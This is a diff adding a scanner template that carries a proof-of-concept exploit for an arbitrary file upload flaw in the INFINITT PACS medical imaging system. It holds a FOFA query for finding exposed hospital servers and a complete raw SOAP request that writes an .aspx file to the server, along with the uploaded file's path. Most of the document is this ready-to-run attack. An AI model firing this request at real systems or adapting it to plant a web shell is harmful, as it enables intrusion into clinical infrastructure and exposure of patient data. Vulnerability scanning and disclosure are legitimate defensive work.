@@ -1,0 +1,81 @@
+id: poc-ysdf34fufu5t1vu1
+info:
+  name: 英飞达影像存档与通讯PACS系统INFINITT_PACS任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ysdf34fufu5t1vu1'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ysdf34fufu5t1vu1
+    fofa: '"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")'
+http:
+- raw:
+  - 'POST /webservices/WebJobUpload.asmx HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: text/xml; charset=utf-8
+
+
+    Soapaction: "http://rainier/jobUpload"
+
+
+    Connection: close
+
+
+
+
+    <?xml version="1.0" encoding="utf-8"?>
+
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+
+    <soap:Body>
+
+
+    <jobUpload xmlns="http://rainier">
+
+
+    <vcode>1</vcode>
+
+
+    <subFolder></subFolder>
+
+
+    <fileName>dudesuite.aspx</fileName>
+
+
+    <bufValue>MTIz</bufValue>
+
+
+    </jobUpload>
+
+
+    </soap:Body>
+
+
+    </soap:Envelope>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    jobUploadResult
+
+
+    # 上传文件定位
+
+    /1/dudesuite.aspx'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
